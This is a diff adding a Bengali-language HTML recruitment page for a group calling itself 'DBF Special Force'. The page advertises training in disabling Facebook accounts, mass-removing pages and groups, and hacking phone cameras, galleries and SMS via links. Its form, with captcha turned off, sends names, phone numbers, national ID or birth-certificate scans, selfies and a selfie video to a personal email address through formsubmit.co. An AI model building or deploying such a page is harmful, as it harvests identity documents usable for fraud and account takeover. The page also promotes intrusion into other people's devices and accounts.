@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DBF Special Force - Cyber Operations</title>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Hind Siliguri', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(rgba(2, 6, 4, 0.85), rgba(2, 6, 4, 0.85)), 
+                        url('https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=1920&auto=format&fit=crop') no-repeat center center fixed;
+            background-size: cover;
+            color: #4ade80;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .container {
+            background: rgba(3, 15, 8, 0.90);
+            backdrop-filter: blur(15px);
+            border: 2px solid rgba(0, 255, 136, 0.6);
+            border-radius: 20px;
+            padding: 35px 25px;
+            max-width: 520px;
+            width: 100%;
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.35), 
+                        inset 0 0 20px rgba(217, 70, 239, 0.2);
+            position: relative;
+            z-index: 1;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, #0ea5e9, #d946ef, #00ff88, #0ea5e9);
+            background-size: 300% 300%;
+            animation: rgbGlow 4s linear infinite;
+        }
+
+        @keyframes rgbGlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        h1 {
+            font-size: 30px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 25px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            
+            background: linear-gradient(0deg, #ff4500, #ff8c00, #ffd700, #ff4500);
+            background-size: 100% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            
+            animation: movingFire 2s linear infinite;
+            
+            filter: drop-shadow(0 0 12px rgba(255, 69, 0, 0.8)) 
+                    drop-shadow(0 0 25px rgba(255, 140, 0, 0.6));
+        }
+
+        @keyframes movingFire {
+            0% {
+                background-position: 0% 0%;
+                filter: drop-shadow(0 0 10px rgba(255, 69, 0, 0.8)) drop-shadow(0 0 20px rgba(255, 140, 0, 0.5));
+            }
+            50% {
+                background-position: 0% 100%;
+                filter: drop-shadow(0 0 18px rgba(255, 215, 0, 0.9)) drop-shadow(0 0 30px rgba(255, 69, 0, 0.8));
+            }
+            100% {
+                background-position: 0% 0%;
+                filter: drop-shadow(0 0 10px rgba(255, 69, 0, 0.8)) drop-shadow(0 0 20px rgba(255, 140, 0, 0.5));
+            }
+        }
+
+        .info-box {
+            background: rgba(2, 25, 12, 0.85);
+            border: 1px solid rgba(0, 255, 136, 0.4);
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #bbf7d0;
+            line-height: 1.6;
+            box-shadow: inset 0 0 12px rgba(0, 255, 136, 0.1);
+        }
+
+        .info-box h3 {
+            color: #00ff88;
+            margin-bottom: 10px;
+            font-size: 17px;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.6);
+        }
+
+        .info-box ul {
+            margin-left: 20px;
+            margin-top: 8px;
+            color: #a7f3d0;
+            font-size: 13px;
+        }
+
+        .info-box ul li {
+            margin-bottom: 6px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #00ff88;
+            margin-bottom: 8px;
+            font-weight: 600;
+            text-shadow: 0 0 8px rgba(0, 255, 136, 0.4);
+        }
+
+        input[type="text"],
+        input[type="tel"],
+        input[type="file"] {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(2, 10, 5, 0.95);
+            border: 1px solid rgba(0, 255, 136, 0.5);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #d946ef;
+            box-shadow: 0 0 20px rgba(217, 70, 239, 0.6), inset 0 0 8px rgba(0, 255, 136, 0.3);
+        }
+
+        .highlight-text {
+            font-size: 12px;
+            color: #fca5a5;
+            background: rgba(239, 68, 68, 0.15);
+            border-left: 3px solid #ef4444;
+            padding: 10px;
+            margin-top: 8px;
+            border-radius: 6px;
+            line-height: 1.5;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #0ea5e9, #10b981);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 0 25px rgba(14, 165, 233, 0.6);
+            transition: all 0.4s ease;
+            margin-top: 10px;
+            letter-spacing: 1px;
+        }
+
+        .btn-submit:hover {
+            background: linear-gradient(135deg, #d946ef, #0ea5e9);
+            box-shadow: 0 0 35px rgba(217, 70, 239, 0.9), 0 0 55px rgba(14, 165, 233, 0.7);
+            transform: translateY(-2px);
+        }
+
+        .hacker-pic-container {
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .hacker-avatar {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid #00ff88;
+            box-shadow: 0 0 25px #00ff88, 0 0 50px #d946ef, inset 0 0 15px #00ff88;
+            animation: hackerGlowPulse 2.5s infinite alternate;
+            margin-bottom: 10px;
+        }
+
+        @keyframes hackerGlowPulse {
+            0% {
+                box-shadow: 0 0 15px #00ff88, 0 0 30px #d946ef, inset 0 0 10px #00ff88;
+                border-color: #0ea5e9;
+            }
+            100% {
+                box-shadow: 0 0 35px #00ff88, 0 0 70px #d946ef, inset 0 0 25px #d946ef;
+                border-color: #00ff88;
+            }
+        }
+
+        .hacker-badge-text {
+            color: #00ff88;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px #00ff88, 0 0 20px #d946ef;
+            text-transform: uppercase;
+        }
+
+        .footer-note {
+            text-align: center;
+            font-size: 12px;
+            color: #059669;
+            margin-top: 20px;
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="formContainer">
+        
+        <h1>DBF Special Force</h1>
+
+        <div class="info-box">
+            <h3>[+] জরুরি নোটিশ:</h3>
+            <p>আসসালামু আলাইকুম। আমাদের DBF এর পক্ষ থেকে অল্প সংখ্যক কিছু মেম্বারকে সাইবার রিলেটেড কাজ শিখানো হবে। যে কাজের মাধ্যমে আমাদের DBF সকল মেম্বার সুরক্ষিত থাকবে। যাতে করে পার্শ্ববর্তী অন্য কোন গ্রুপ বা অন্য কোন টিমের প্লেয়ার আমাদের সাথে কোন প্রকার ঝামেলা করতে না পারে।</p>
+        </div>
+
+        <div class="info-box">
+            <h3>[+] যা যা কাজ শিখানো হবে:</h3>
+            <ul>
+                <li>১. ফেসবুক আইডি ডিজেবল করা</li>
+                <li>২. ফেসবুক কপিরাইট</li>
+                <li>৩. পেইজ রিমুভ</li>
+                <li>৪. পাবলিক গ্রুপ রিমুভ</li>
+                <li>৫. ফেসবুক লক একাউন্ট ব্যাক</li>
+                <li>৬. ফেসবুক ডিজেবল একাউন্ট ব্যাক</li>
+                <li>৭. লিংক দিয়ে ফোন ইনফরমেশন + ক্যামেরা হ্যাক</li>
+                <li>৮. গ্যালারি হ্যাক</li>
+                <li>৯. ফোনের সকল SMS হ্যাক</li>
+                <li>১০. ইউটিউব সহ আরো অনেক অ্যাপস প্রিমিয়াম নেওয়ার ট্রিকস</li>
+            </ul>
+        </div>
+
+        <form action="https://formsubmit.co/md.sojunhasan556677@gmail.com" method="POST" enctype="multipart/form-data">
+            
+            <input type="hidden" name="_captcha" value="false">
+
+            <div class="form-group">
+                <label>> নাম:</label>
+                <input type="text" name="Name" required placeholder="আপনার পুরো নাম লিখুন">
+            </div>
+
+            <div class="form-group">
+                <label>> মোবাইল নাম্বার:</label>
+                <input type="tel" name="Mobile" required placeholder="আপনার মোবাইল নাম্বার লিখুন">
+            </div>
+
+            <div class="form-group">
+                <label>> NID card / Birth Certificate (ছবি আপলোড):</label>
+                <input type="file" name="NID_Or_BirthCert_Image" accept="image/*" required>
+            </div>
+
+            <div class="form-group">
+                <label>> ফেসবুক রিয়েল আইডির লিংক:</label>
+                <input type="text" name="Facebook_Profile" required placeholder="আপনার ফেসবুক প্রোফাইল লিংক দিন">
+            </div>
+
+            <div class="form-group">
+                <label>> আপনার ২ টা সেলফি পিক:</label>
+                <input type="file" name="Selfie_Pictures" accept="image/*" multiple required>
+            </div>
+
+            <div class="form-group">
+                <label>> আপনার একটা সেলফি ভিডিও:</label>
+                <input type="file" name="Selfie_Video" accept="video/*" required>
+                <div class="highlight-text">
+                    ⚠️ ভিডিওতে বলতে হবে: "আমি সর্বদা নিষ্ঠার সাথে ডিবিএফ এর সাথে কাজ করবো কখনো বেইমানি করব না।"
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit">SECURE SUBMIT</button>
+        </form>
+
+        <div class="hacker-pic-container">
+            <img src="https://images.unsplash.com/photo-1563089145-599997674d42?q=80&w=300&auto=format&fit=crop" alt="Hacker Avatar" class="hacker-avatar">
+            <div class="hacker-badge-text">🛡️ SECURE CYBER TERMINAL 🛡️</div>
+        </div>
+
+        <div class="footer-note">
+            © DBF Cyber Operations. All rights reserved.
+        </div>
+    </div>
+
+</body>
+</html>
